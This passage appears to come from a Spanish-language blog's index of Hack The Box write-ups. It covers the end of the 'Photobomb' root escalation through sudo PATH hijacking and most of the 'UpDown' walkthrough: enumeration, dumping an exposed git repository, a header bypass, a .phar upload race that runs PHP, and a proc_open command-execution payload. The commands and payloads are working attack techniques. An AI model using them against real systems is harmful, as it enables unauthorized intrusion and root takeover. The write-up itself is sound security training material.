] then /bin/cat log/photobomb.log \u0026gt; log/photobomb.log.old /usr/bin/truncate -s0 log/photobomb.log fi # protect the priceless originals find source_images -type f -name \u0026#39;*.jpg\u0026#39; -exec chown root:root {} \\; wizard@photobomb:~$ Creamos el archivo find en el cual agregamos como comando a ejecutar bash, finalmente le dimos permisos de ejecución.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 wizard@photobomb:/dev/shm$ cd /dev/shm wizard@photobomb:/dev/shm$ ls -lah total 0 drwxrwxrwt 3 root root 60 Nov 7 18:19 . drwxr-xr-x 18 root root 3.9K Nov 7 18:19 .. drwx------ 4 root root 80 Nov 7 18:19 multipath wizard@photobomb:/dev/shm$ echo \u0026#34;/bin/bash\u0026#34; \u0026gt; find wizard@photobomb:/dev/shm$ chmod +x find wizard@photobomb:/dev/shm$ ls -lah total 4.0K drwxrwxrwt 3 root root 80 Nov 8 04:04 . drwxr-xr-x 18 root root 3.9K Nov 7 18:19 .. -rwxr-xr-x 1 wizard wizard 10 Nov 8 04:04 find drwx------ 4 root root 80 Nov 7 18:19 multipath wizard@photobomb:/dev/shm$ Ejecutamos el script modificando la variable $PATH, agregando al inicio el directorio actual (.), tras ello se ejecutaría nuestra \u0026ldquo;version\u0026rdquo; de find, ejecutando bash, finalmente obtenemos acceso a una shell bash como root.\n1 2 3 4 5 6 7 8 9 10 wizard@photobomb:/dev/shm$ sudo PATH=.:$PATH /opt/cleanup.sh root@photobomb:/home/wizard/photobomb# whoami;id root uid=0(root) gid=0(root) groups=0(root) root@photobomb:/home/wizard/photobomb# cd /root root@photobomb:~# ls root.txt root@photobomb:~# cat root.txt 1b593c49dc417b05cbf5e78d8a5e5eca root@photobomb:~# ","description":"El sitio web de Photobomb permite la descarga y manipulación de imagenes, tras manipular los parametros del sitio descubrimos Command Injection esto nos permitio acceder a la máquina. Finalmente escalamos privilegios manipulando la variable de entorno PATH junto con la ejecución de un script con sudo.","id":6,"section":"posts","tags":["command injection","setenv","sudo privesc"],"title":"Hack The Box - Photobomb","uri":"https://sckull.github.io/posts/photobomb/"},{"content":"\rUpDown expone el repositorio de su sitio web, tras analizar el codigo fuente del sitio identificamos que es posible ejecutar codigo PHP lo cual nos permitió acceder a un primer usuario. La funcion input() vulnerable de Python2.7 dentro de un script nos dio acceso a un segundo usuario por SSH. Finalmente escalamos privilegios por medio de easy_install de Python.\nNombre UpDown OS Linux Puntos 30 Dificultad Media IP 10.10.11.177 Maker AB2\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.2, 5.3, 5.1, 4.9, 4.7],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: http (80) y ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Nmap 7.92 scan initiated Wed Sep 7 13:43:17 2022 as: nmap -p22,80 -sV -sC -oN nmap_scan 10.10.11.177 Nmap scan report for 10.10.11.177 (10.10.11.177) Host is up (0.067s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA) | 256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA) |_ 256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Is my Website up ? Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Sep 7 13:43:27 2022 -- 1 IP address (1 host up) scanned in 10.00 seconds Web Site El sitio web presenta un formulario para el ingreso de una dirección URL, esto para verificar si un sitio está disponible. Tambien, se muestra una opcion para activar el modo Debug. Además muestra un dominio en el footer.\nRealizamos una prueba a un servidor http con python, el sitio muestra los headers y el body del sitio web al que verifica si está disponible.\nSi observamos la solicitud con netcat no muestra algun sofware o teconología en los headers.\n1 2 3 4 5 6 7 8 π ~/htb/updown ❯ sudo nc -lvp 80 [sudo] password for sckull: listening on [any] 80 ... connect to [10.10.14.207] from siteisup.htb [10.10.11.177] 39652 GET / HTTP/1.1 Host: 10.10.14.207 User-Agent: siteisup.htb Accept: */* Directory Brute Forcing feroxbuster además de las direcciones ya conocidas, muestra el directorio /dev.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 π ~/htb/updown ❯ feroxbuster -u http://10.10.11.177/ -w $MD -x php ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.3.3 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.11.177/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.3 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💲 Extensions │ [php] 🔃 Recursion Depth │ 4 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 200 40l 93w 1131c http://10.10.11.177/index.php 301 9l 28w 310c http://10.10.11.177/dev 200 0l 0w 0c http://10.10.11.177/dev/index.php 403 9l 28w 277c http://10.10.11.177/server-status [####################] - 33m 882180/882180 0s found:4 errors:261 [####################] - 33m 441090/441090 218/s http://10.10.11.177/ [####################] - 33m 441090/441090 219/s http://10.10.11.177/dev Dicho directorio parece estar vacio.\n1 2 3 4 5 6 7 8 π ~/htb/updown ❯ curl -sI http://10.10.11.177/dev/ HTTP/1.1 200 OK Date: Tue, 13 Sep 2022 22:14:47 GMT Server: Apache/2.4.41 (Ubuntu) Content-Type: text/html; charset=UTF-8 π ~/htb/updown ❯ curl -s http://10.10.11.177/dev/ π ~/htb/updown ❯ Luego de intentar con diferentes diccionarios en el sitio, descubrimos el directorio /.git.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 π ~/htb/updown ❯ feroxbuster -u http://10.10.11.177/dev -w $CM ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.3.3 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.11.177/dev 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirb/common.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.3 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔃 Recursion Depth │ 4 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 200 1l 2w 21c http://10.10.11.177/dev/.git/HEAD 403 9l 28w 277c http://10.10.11.177/dev/.hta 403 9l 28w 277c http://10.10.11.177/dev/.htaccess 403 9l 28w 277c http://10.10.11.177/dev/.htpasswd 200 0l 0w 0c http://10.10.11.177/dev/index.php [####################] - 13s 4613/4613 0s found:5 errors:0 [####################] - 13s 4613/4613 350/s http://10.10.11.177/dev π ~/htb/updown ❯ Vhosts Además descubrimos un nuevo subdominio, dev.siteisup.htb.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 π ~/htb/updown ❯ ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H \u0026#34;Host: FUZZ.siteisup.htb\u0026#34; -u http://siteisup.htb -fl 40 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.4.1-dev ________________________________________________ :: Method : GET :: URL : http://siteisup.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt :: Header : Host: FUZZ.siteisup.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response lines: 40 ________________________________________________ dev [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 4005ms] :: Progress: [100000/100000] :: Job [1/1] :: 504 req/sec :: Duration: [0:04:04] :: Errors: 0 :: π ~/htb/updown ❯ Sin embargo este muestra que no tenemos permisos.\n1 2 3 4 5 6 7 8 9 10 11 π ~/htb/updown ❯ curl -s http://dev.siteisup.htb \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;403 Forbidden\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Forbidden\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;You don\u0026#39;t have permission to access this resource.\u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.41 (Ubuntu) Server at dev.siteisup.htb Port 80\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; π ~/htb/updown ❯ Git Dumper Utilizando git-dumper obtuvimos el repositorio expuesto en el sitio web.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 π ~/htb/updown ❯ /opt/git-dumper/git_dumper.py http://10.10.11.177/dev/ repo_dev [-] Testing http://10.10.11.177/dev/.git/HEAD [200] [-] Testing http://10.10.11.177/dev/.git/ [200] [-] Fetching .git recursively [-] Fetching http://10.10.11.177/dev/.git/ [200] [-] Fetching http://10.10.11.177/dev/.gitignore [404] [-] http://10.10.11.177/dev/.gitignore responded with status code 404 [-] Fetching http://10.10.11.177/dev/.git/packed-refs [200] [-] Fetching http://10.10.11.177/dev/.git/HEAD [200] [-] Fetching http://10.10.11.177/dev/.git/description [200] [-] Fetching http://10.10.11.177/dev/.git/hooks/ [200] [-] Fetching http://10.10.11.177/dev/.git/objects/ [200] [-] Fetching http://10.10.11.177/dev/.git/logs/ [200] [-] Fetching http://10.10.11.177/dev/.git/index [200] [-] Fetching http://10.10.11.177/dev/.git/info/ [200] [-] Fetching http://10.10.11.177/dev/.git/refs/ [200] [-] Fetching http://10.10.11.177/dev/.git/branches/ [200] [-] Fetching http://10.10.11.177/dev/.git/refs/remotes/ [200] [-] Fetching http://10.10.11.177/dev/.git/refs/heads/ [200] [-] Fetching http://10.10.11.177/dev/.git/refs/tags/ [200] [-] Fetching http://10.10.11.177/dev/.git/objects/pack/ [200] [-] Fetching http://10.10.11.177/dev/.git/hooks/applypatch-msg.sample [200] [-] Fetching http://10.10.11.177/dev/.git/objects/info/ [200] [-] Fetching http://10.10.11.177/dev/.git/logs/HEAD [200] [-] Fetching http://10.10.11.177/dev/.git/logs/refs/ [200] [-] Fetching http://10.10.11.177/dev/.git/info/exclude [200] [-] Fetching http://10.10.11.177/dev/.git/hooks/commit-msg.sample [200] [-] Fetching http://10.10.11.177/dev/.git/hooks/fsmonitor-watchman.sample [200] [-] Fetching http://10.10.11.177/dev/.git/hooks/post-update.sample [200] [-] Fetching http://10.10.11.177/dev/.git/hooks/pre-applypatch.sample [200] [-] Fetching http://10.10.11.177/dev/.git/hooks/pre-commit.sample [200] [-] Fetching http://10.10.11.177/dev/.git/hooks/pre-push.sample [200] [-] Fetching http://10.10.11.177/dev/.git/hooks/pre-merge-commit.sample [200] [-] Fetching http://10.10.11.177/dev/.git/hooks/pre-receive.sample [200] [-] Fetching http://10.10.11.177/dev/.git/hooks/pre-rebase.sample [200] [-] Fetching http://10.10.11.177/dev/.git/hooks/prepare-commit-msg.sample [200] [-] Fetching http://10.10.11.177/dev/.git/hooks/push-to-checkout.sample [200] [-] Fetching http://10.10.11.177/dev/.git/hooks/update.sample [200] [-] Fetching http://10.10.11.177/dev/.git/refs/remotes/origin/ [200] [-] Fetching http://10.10.11.177/dev/.git/refs/heads/main [200] [-] Fetching http://10.10.11.177/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.idx [200] [-] Fetching http://10.10.11.177/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.pack [200] [-] Fetching http://10.10.11.177/dev/.git/logs/refs/heads/ [200] [-] Fetching http://10.10.11.177/dev/.git/logs/refs/remotes/ [200] [-] Fetching http://10.10.11.177/dev/.git/refs/remotes/origin/HEAD [200] [-] Fetching http://10.10.11.177/dev/.git/logs/refs/heads/main [200] [-] Fetching http://10.10.11.177/dev/.git/logs/refs/remotes/origin/ [200] [-] Fetching http://10.10.11.177/dev/.git/config [200] [-] Fetching http://10.10.11.177/dev/.git/logs/refs/remotes/origin/HEAD [200] [-] Running git checkout . Updated 6 paths from the index π ~/htb/updown ❯ Dev Repo Analizando los archivos, observamos .htacces, segun la configuración de este archivo, es requerido el header Special-Dev: only4dev para acceder al sitio, seguramente con ello podemos acceder al subdominio.\n1 2 3 4 5 6 7 π repo_dev main ❯ cat .htaccess SetEnvIfNoCase Special-Dev \u0026#34;only4dev\u0026#34; Required-Header Order Deny,Allow Deny from All Allow from env=Required-Header π repo_dev main ❯ Utilizando el header mencionado logramos acceder al contenido del subdominio, se muestra una version similar al del dominio.\nObservamos el codigo fuente para las paginas admin, index y checker.\nExpand me\r1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;b\u0026gt;This is only for developers\u0026lt;/b\u0026gt; \u0026lt;br\u0026gt; \u0026lt;a href=\u0026#34;?page=admin\u0026#34;\u0026gt;Admin Panel\u0026lt;/a\u0026gt; \u0026lt;?php define(\u0026#34;DIRECTACCESS\u0026#34;,false); $page=$_GET[\u0026#39;page\u0026#39;]; if($page \u0026amp;\u0026amp; !preg_match(\u0026#34;/bin|usr|home|var|etc/i\u0026#34;,$page)){ include($_GET[\u0026#39;page\u0026#39;] . \u0026#34;.php\u0026#34;); }else{ include(\u0026#34;checker.php\u0026#34;); } ?\u0026gt; 1 2 3 4 5 6 7 \u0026lt;?php if(DIRECTACCESS){ die(\u0026#34;Access Denied\u0026#34;); } #ToDo ?\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 \u0026lt;?php if(DIRECTACCESS){ die(\u0026#34;Access Denied\u0026#34;); } ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#39;utf-8\u0026#39; /\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;chrome=1\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; media=\u0026#34;screen\u0026#34; href=\u0026#34;stylesheet.css\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Is my Website up ? (beta version)\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;header_wrap\u0026#34; class=\u0026#34;outer\u0026#34;\u0026gt; \u0026lt;header class=\u0026#34;inner\u0026#34;\u0026gt; \u0026lt;h1 id=\u0026#34;project_title\u0026#34;\u0026gt;Welcome,\u0026lt;br\u0026gt; Is My Website UP ?\u0026lt;/h1\u0026gt; \u0026lt;h2 id=\u0026#34;project_tagline\u0026#34;\u0026gt;In this version you are able to scan a list of websites !\u0026lt;/h2\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;main_content_wrap\u0026#34; class=\u0026#34;outer\u0026#34;\u0026gt; \u0026lt;section id=\u0026#34;main_content\u0026#34; class=\u0026#34;inner\u0026#34;\u0026gt; \u0026lt;form method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;label\u0026gt;List of websites to check:\u0026lt;/label\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; size=\u0026#34;50\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;check\u0026#34; type=\u0026#34;submit\u0026#34; value=\u0026#34;Check\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php function isitup($url){ $ch=curl_init(); curl_setopt($ch, CURLOPT_URL, trim($url)); curl_setopt($ch, CURLOPT_USERAGENT, \u0026#34;siteisup.htb beta\u0026#34;); curl_setopt($ch, CURLOPT_HEADER, 1); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_TIMEOUT, 30); $f = curl_exec($ch); $header = curl_getinfo($ch); if($f AND $header[\u0026#39;http_code\u0026#39;] == 200){ return array(true,$f); }else{ return false; } curl_close($ch); } if($_POST[\u0026#39;check\u0026#39;]){ # File size must be less than 10kb. if ($_FILES[\u0026#39;file\u0026#39;][\u0026#39;size\u0026#39;] \u0026gt; 10000) { die(\u0026#34;File too large!\u0026#34;); } $file = $_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]; # Check if extension is allowed. $ext = getExtension($file); if(preg_match(\u0026#34;/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i\u0026#34;,$ext)){ die(\u0026#34;Extension not allowed!\u0026#34;); } # Create directory to upload our file. $dir = \u0026#34;uploads/\u0026#34;.md5(time()).\u0026#34;/\u0026#34;; if(!is_dir($dir)){ mkdir($dir, 0770, true); } # Upload the file. $final_path = $dir.$file; move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], \u0026#34;{$final_path}\u0026#34;); # Read the uploaded file. $websites = explode(\u0026#34;\\n\u0026#34;,file_get_contents($final_path)); foreach($websites as $site){ $site=trim($site); if(!preg_match(\u0026#34;#file://#i\u0026#34;,$site) \u0026amp;\u0026amp; !preg_match(\u0026#34;#data://#i\u0026#34;,$site) \u0026amp;\u0026amp; !preg_match(\u0026#34;#ftp://#i\u0026#34;,$site)){ $check=isitup($site); if($check){ echo \u0026#34;\u0026lt;center\u0026gt;{$site}\u0026lt;br\u0026gt;\u0026lt;font color=\u0026#39;green\u0026#39;\u0026gt;is up ^_^\u0026lt;/font\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; }else{ echo \u0026#34;\u0026lt;center\u0026gt;{$site}\u0026lt;br\u0026gt;\u0026lt;font color=\u0026#39;red\u0026#39;\u0026gt;seems to be down :(\u0026lt;/font\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; } }else{ echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;font color=\u0026#39;red\u0026#39;\u0026gt;Hacking attempt was detected !\u0026lt;/font\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; } } # Delete the uploaded file. @unlink($final_path); } function getExtension($file) { $extension = strrpos($file,\u0026#34;.\u0026#34;); return ($extension===false) ? \u0026#34;\u0026#34; : substr($file,$extension+1); } ?\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;footer_wrap\u0026#34; class=\u0026#34;outer\u0026#34;\u0026gt; \u0026lt;footer class=\u0026#34;inner\u0026#34;\u0026gt; \u0026lt;p class=\u0026#34;copyright\u0026#34;\u0026gt;siteisup.htb (beta)\u0026lt;/p\u0026gt;\u0026lt;br\u0026gt; \u0026lt;a class=\u0026#34;changelog\u0026#34; href=\u0026#34;changelog.txt\u0026#34;\u0026gt;changelog.txt\u0026lt;/a\u0026gt;\u0026lt;br\u0026gt; \u0026lt;/footer\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Vemos la funcion isitup() la cual realiza una solicitud utilizando curl verificando que el codigo de respuesta del sitio sea 200, en este caso retorna un array. Asi mismo la función getExtension() que obtiene la extension de un string.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 /* ... ... */ function isitup($url){ $ch=curl_init(); curl_setopt($ch, CURLOPT_URL, trim($url)); curl_setopt($ch, CURLOPT_USERAGENT, \u0026#34;siteisup.htb beta\u0026#34;); curl_setopt($ch, CURLOPT_HEADER, 1); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_TIMEOUT, 30); $f = curl_exec($ch); $header = curl_getinfo($ch); if($f AND $header[\u0026#39;http_code\u0026#39;] == 200){ return array(true,$f); }else{ return false; } curl_close($ch); } /* ... ... */ function getExtension($file) { $extension = strrpos($file,\u0026#34;.\u0026#34;); return ($extension===false) ? \u0026#34;\u0026#34; : substr($file,$extension+1); } En la solicitud POST del parametro check:\nVerifica que el archivo no sea mayor a 10kb. Que la extension del archivo no exista en la expresion regular. Crea un nuevo directorio en /uploads utilizando md5 y la función time(), dentro de este mueve el archivo enviado (ips_list.txt). Con el archivo ya en el directorio, divide el archivo en cada salto de linea, para finalmente verificar que cada linea sea una URL, de ser asi verifica la disponibilidad de este con la función isitup() segun la respuesta imprime el resultado. Tras ello elimina el archivo creado. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 if($_POST[\u0026#39;check\u0026#39;]){ # File size must be less than 10kb. if ($_FILES[\u0026#39;file\u0026#39;][\u0026#39;size\u0026#39;] \u0026gt; 10000) { die(\u0026#34;File too large!\u0026#34;); } $file = $_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]; # Check if extension is allowed. $ext = getExtension($file); if(preg_match(\u0026#34;/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i\u0026#34;,$ext)){ die(\u0026#34;Extension not allowed!\u0026#34;); } # Create directory to upload our file. $dir = \u0026#34;uploads/\u0026#34;.md5(time()).\u0026#34;/\u0026#34;; if(!is_dir($dir)){ mkdir($dir, 0770, true); } # Upload the file. $final_path = $dir.$file; move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], \u0026#34;{$final_path}\u0026#34;); # Read the uploaded file. $websites = explode(\u0026#34;\\n\u0026#34;,file_get_contents($final_path)); foreach($websites as $site){ $site=trim($site); if(!preg_match(\u0026#34;#file://#i\u0026#34;,$site) \u0026amp;\u0026amp; !preg_match(\u0026#34;#data://#i\u0026#34;,$site) \u0026amp;\u0026amp; !preg_match(\u0026#34;#ftp://#i\u0026#34;,$site)){ $check=isitup($site); if($check){ echo \u0026#34;\u0026lt;center\u0026gt;{$site}\u0026lt;br\u0026gt;\u0026lt;font color=\u0026#39;green\u0026#39;\u0026gt;is up ^_^\u0026lt;/font\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; }else{ echo \u0026#34;\u0026lt;center\u0026gt;{$site}\u0026lt;br\u0026gt;\u0026lt;font color=\u0026#39;red\u0026#39;\u0026gt;seems to be down :(\u0026lt;/font\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; } }else{ echo \u0026#34;\u0026lt;center\u0026gt;\u0026lt;font color=\u0026#39;red\u0026#39;\u0026gt;Hacking attempt was detected !\u0026lt;/font\u0026gt;\u0026lt;/center\u0026gt;\u0026#34;; } } # Delete the uploaded file. @unlink($final_path); } User - www-data Si observamos existe cierto limite de tiempo para acceder al archivo subido (ip_list.txt), de ser posible podriamos verificar si dentro de este es posible ejecutar codigo php tras visitar upload/\u0026lt;nombre_archivo_en_md5\u0026gt;.\u0026lt;extension_php\u0026gt;.\nComo sabemos el sitio verifica que las direcciones dentro del archivo estén disponibles, si enviamos direcciones a las cuales la máquina no puede acceder podemos crear un lapso de tiempo para poder acceder al sitio (tiempo de espera de respuesta del sitio en curl). Verificamos esto en el tiempo de respuesta del sitio, 80 segundos.\nAhora vamos con la extension del archivo, si observamos existen ciertas extensiones que no estan permitidas.\n1 2 3 if(preg_match(\u0026#34;/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i\u0026#34;,$ext)){ die(\u0026#34;Extension not allowed!\u0026#34;); } También existen distintas extensiones que podríamos utlizar para el archivo.\n1 2 3 4 5 6 7 8 9 .phps .phps .pht .phtm .pgif .shtml .htaccess .phar .inc Nuestro archivo de ips tendría el siguiente contenido.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 [.. more url ..] https://superdupersite.com https://superdupersite.com https://superdupersite.com https://superdupersite.com https://superdupersite.com https://superdupersite.com https://superdupersite.com https://superdupersite.com https://superdupersite.com \u0026lt;?php echo \u0026#34;hello there\u0026#34;; ?\u0026gt; Intentamos con las distintas extensiones, .phar nos permitio ejecutar codigo php.\n1 2 3 4 5 6 7 8 9 10 11 12 ~/htb/updown ❯ curl -s http://dev.siteisup.htb/uploads/ac7bdcb73e80004725d9d9f08bfa0fe6/file.phar -H \u0026#34;Special-Dev: only4dev\u0026#34; | tail https://superdupersite.com https://superdupersite.com https://superdupersite.com https://superdupersite.com https://superdupersite.com https://superdupersite.com https://superdupersite.com https://superdupersite.com https://superdupersite.com hello there π ~/htb/updown ❯ Shell Intentamos distintas shells inversas en PHP pero ninguna ejecutaba comandos en la máquina. Un post de Acunetix nos muestra una linea de codigo que nos permite imprimir las funciones peligrosas que nos permitirían ejecutar comandos.\n1 2 3 \u0026lt;?php print_r(preg_grep(\u0026#34;/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)$/\u0026#34;, get_defined_functions(TRUE)[\u0026#34;internal\u0026#34;])); ?\u0026gt; Esta nos muestra proc_open, en el mismo post se refiere a la documentacion de PHP de proc_open.\n1 Array ( [493] =\u0026gt; show_source [515] =\u0026gt; parse_ini_file [789] =\u0026gt; proc_open [935] =\u0026gt; curl_exec [942] =\u0026gt; curl_multi_exec ) Se muestran distintas formas de ejecutar codigo con esta funcion, encontramos una solucion en StackOverflow, la cual nos permitio obtener multiples pings desde la máquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php $descriptorspec = array( 0 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;r\u0026#34;), 1 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;), 2 =\u0026gt; array(\u0026#34;file\u0026#34;, \u0026#34;error.txt\u0026#34;, \u0026#34;a\u0026#34;) ); $process = proc_open(\u0026#39;ping -c 4 